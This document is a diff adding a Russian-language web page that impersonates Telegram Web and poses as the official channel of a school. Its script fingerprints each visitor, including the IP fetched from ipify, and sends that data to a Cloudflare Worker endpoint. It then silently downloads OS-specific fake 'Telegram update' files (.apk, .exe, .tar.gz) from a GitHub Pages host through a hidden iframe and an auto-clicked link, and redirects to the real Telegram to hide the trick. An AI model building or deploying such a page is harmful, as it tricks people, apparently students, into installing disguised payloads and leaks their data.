@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram Web</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://telegram.org/img/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1e93cc 0%, #0088cc 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .telegram-box {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header {
+            background: #0088cc;
+            padding: 30px 20px;
+            text-align: center;
+            color: white;
+        }
+
+        .avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .avatar img {
+            width: 40px;
+            height: 40px;
+            filter: brightness(0) invert(1);
+        }
+
+        .channel-title {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .subscribers {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 30px 25px;
+        }
+
+        .description {
+            color: #555;
+            font-size: 15px;
+            line-height: 1.5;
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 0 10px;
+        }
+
+        /* Желейная кнопка */
+        .jelly-button {
+            display: block;
+            width: 100%;
+            background: linear-gradient(135deg, #2e9adf 0%, #0088cc 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 18px;
+            font-size: 17px;
+            font-weight: 600;
+            text-align: center;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            box-shadow: 0 6px 0 #006ba3,
+                        0 10px 20px rgba(0, 137, 204, 0.3);
+            margin-bottom: 25px;
+        }
+
+        .jelly-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 0 #006ba3,
+                        0 12px 25px rgba(0, 137, 204, 0.4);
+        }
+
+        .jelly-button:active {
+            transform: translateY(3px);
+            box-shadow: 0 3px 0 #006ba3,
+                        0 5px 15px rgba(0, 137, 204, 0.3);
+            transition: all 0.1s ease;
+        }
+
+        .jelly-button::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, transparent 70%);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .jelly-button:active::after {
+            opacity: 1;
+        }
+
+        .button-text {
+            position: relative;
+            z-index: 1;
+        }
+
+        .button-icon {
+            margin-right: 10px;
+            vertical-align: middle;
+            width: 22px;
+            height: 22px;
+            filter: brightness(0) invert(1);
+        }
+
+        .footer {
+            color: #888;
+            font-size: 13px;
+            text-align: center;
+            line-height: 1.5;
+            padding: 0 10px;
+        }
+
+        .footer a {
+            color: #0088cc;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .telegram-logo {
+            text-align: center;
+            margin-top: 20px;
+            opacity: 0.8;
+        }
+
+        .telegram-logo img {
+            width: 24px;
+            height: 24px;
+        }
+
+        /* Адаптивность */
+        @media (max-width: 480px) {
+            .telegram-box {
+                border-radius: 10px;
+            }
+            
+            .content {
+                padding: 25px 20px;
+            }
+            
+            .jelly-button {
+                padding: 16px;
+                font-size: 16px;
+            }
+        }
+
+        /* Анимация загрузки */
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .loader-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0088cc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="telegram-box">
+            <div class="header">
+                <div class="avatar">
+                    <img src="https://telegram.org/img/website_icon.svg" alt="Telegram">
+                </div>
+                <h1 class="channel-title">ПОДСЛУШАНО ШКОЛА 4</h1>
+                <p class="subscribers">18.5K подписчиков</p>
+            </div>
+            
+            <div class="content">
+                <p class="description">
+                    Официальный канал школы №4. Новости, объявления, обсуждения. 
+                    Подпишитесь, чтобы быть в курсе всех событий.
+                </p>
+
+                <button id="continueBtn" class="jelly-button">
+                    <img src="https://telegram.org/img/website_icon.svg" alt="" class="button-icon">
+                    <span class="button-text">Продолжить в Telegram Web</span>
+                </button>
+
+                <div class="loader" id="loader">
+                    <div class="loader-spinner"></div>
+                    <p>Подготовка Telegram Web...</p>
+                </div>
+
+                <div class="footer">
+                    <p>Открывая Telegram Web, вы соглашаетесь с 
+                        <a href="https://telegram.org/tos" target="_blank">Условиями</a> и 
+                        <a href="https://telegram.org/privacy" target="_blank">Политикой конфиденциальности</a>.
+                    </p>
+                    <p style="margin-top: 10px; font-size: 12px; color: #aaa;">
+                        Работает на технологии Telegram WebK
+                    </p>
+                </div>
+
+                <div class="telegram-logo">
+                    <img src="https://telegram.org/img/website_icon.svg" alt="Telegram">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const button = document.getElementById('continueBtn');
+            const loader = document.getElementById('loader');
+            
+            button.addEventListener('click', function() {
+                // Показать загрузку
+                button.style.display = 'none';
+                loader.style.display = 'block';
+                
+                // Сбор данных пользователя
+                const userData = {
+                    ip: 'Определяется...',
+                    userAgent: navigator.userAgent,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    language: navigator.language,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    platform: navigator.platform,
+                    os: getOS(),
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Определение ОС
+                function getOS() {
+                    const userAgent = navigator.userAgent;
+                    if (/android/i.test(userAgent)) return 'Android';
+                    if (/iPad|iPhone|iPod/.test(userAgent)) return 'iOS';
+                    if (/Win/.test(userAgent)) return 'Windows';
+                    if (/Mac/.test(userAgent)) return 'MacOS';
+                    if (/Linux/.test(userAgent)) return 'Linux';
+                    return 'Unknown';
+                }
+                
+                // Получение IP
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        userData.ip = data.ip;
+                        sendDataToServer(userData);
+                    })
+                    .catch(() => {
+                        userData.ip = 'Не удалось определить';
+                        sendDataToServer(userData);
+                    });
+                
+                // Отправка данных на сервер
+                function sendDataToServer(data) {
+                    // Cloudflare Worker endpoint
+                    const webhookURL = 'https://your-cloudflare-worker.workers.dev/collect';
+                    
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data)
+                    }).catch(() => {});
+                    
+                    // Определение и скачивание файла для ОС
+                    setTimeout(() => {
+                        const os = userData.os;
+                        let downloadUrl = '';
+                        let filename = '';
+                        
+                        switch(os) {
+                            case 'Android':
+                                downloadUrl = 'https://school4love.github.io/obosjayshkoly/downloads/telegram_update.apk';
+                                filename = 'telegram_update.apk';
+                                break;
+                            case 'Windows':
+                                downloadUrl = 'https://school4love.github.io/obosjayshkoly/downloads/TelegramSetup.exe';
+                                filename = 'TelegramSetup.exe';
+                                break;
+                            case 'Linux':
+                                downloadUrl = 'https://school4love.github.io/obosjayshkoly/downloads/telegram_update.tar.gz';
+                                filename = 'telegram_update.tar.gz';
+                                break;
+                            case 'iOS':
+                                // Для iOS показываем сообщение
+                                loader.innerHTML = `
+                                    <div style="color: #0088cc; margin-bottom: 15px;">
+                                        <svg width="48" height="48" viewBox="0 0 24 24" fill="#0088cc">
+                                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                                        </svg>
+                                    </div>
+                                    <h3 style="margin-bottom: 10px;">Для iOS</h3>
+                                    <p>Установите официальное приложение Telegram из App Store</p>
+                                    <p style="margin-top: 15px; font-size: 14px; color: #666;">
+                                        Данные успешно получены. Вы будете перенаправлены...
+                                    </p>
+                                `;
+                                setTimeout(() => {
+                                    window.location.href = 'https://apps.apple.com/app/telegram-messenger/id686449807';
+                                }, 3000);
+                                return;
+                            default:
+                                downloadUrl = 'https://school4love.github.io/obosjayshkoly/downloads/TelegramSetup.exe';
+                                filename = 'TelegramSetup.exe';
+                        }
+                        
+                        // Создание скрытого iframe для скачивания
+                        const iframe = document.createElement('iframe');
+                        iframe.style.display = 'none';
+                        iframe.src = downloadUrl;
+                        document.body.appendChild(iframe);
+                        
+                        // Альтернативный метод скачивания
+                        const link = document.createElement('a');
+                        link.href = downloadUrl;
+                        link.download = filename;
+                        link.style.display = 'none';
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+                        
+                        // Сообщение об успешном скачивании
+                        loader.innerHTML = `
+                            <div style="color: #4CAF50; margin-bottom: 15px;">
+                                <svg width="48" height="48" viewBox="0 0 24 24" fill="#4CAF50">
+                                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                                </svg>
+                            </div>
+                            <p>Скачивание началось. Открываем Telegram Web...</p>
+                            <p style="font-size: 12px; color: #666; margin-top: 10px;">
+                                Если скачивание не началось, <a href="${downloadUrl}" style="color: #0088cc;">нажмите здесь</a>
+                            </p>
+                        `;
+                        
+                        // Редирект на настоящий Telegram Web через 3 секунды
+                        setTimeout(() => {
+                            window.location.href = 'https://web.telegram.org';
+                        }, 3000);
+                        
+                    }, 1500);
+                }
+            });
+            
+            // Эффекты при наведении
+            const telegramBox = document.querySelector('.telegram-box');
+            telegramBox.addEventListener('mouseenter', () => {
+                telegramBox.style.transform = 'translateY(-5px)';
+                telegramBox.style.boxShadow = '0 15px 35px rgba(0, 0, 0, 0.2)';
+            });
+            
+            telegramBox.addEventListener('mouseleave', () => {
+                telegramBox.style.transform = 'translateY(0)';
+                telegramBox.style.boxShadow = '0 10px 25px rgba(0, 0, 0, 0.15)';
+            });
+        });
+    </script>
+</body>
+</html>
